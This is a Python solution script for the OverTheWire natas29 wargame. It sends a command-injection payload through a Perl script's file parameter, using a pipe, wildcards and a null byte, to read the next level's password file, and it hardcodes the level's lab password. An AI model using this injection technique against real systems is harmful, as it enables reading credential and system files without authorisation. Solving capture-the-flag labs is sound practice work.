import requests
import re

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    payload = "index.pl?file=|cat+/etc/na*as_webpass/na*as30%00"
    req = requests.get(url + payload,auth=(username,password))
    html_content = req.text.strip()
    lines = html_content.split('\n')
    print("The flag for natas29 is: " + lines[-1])

if __name__=="__main__":
    url = "http://natas29.natas.labs.overthewire.org/"
    username = "natas29"
    password = "pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno"
    flag(url,username,password)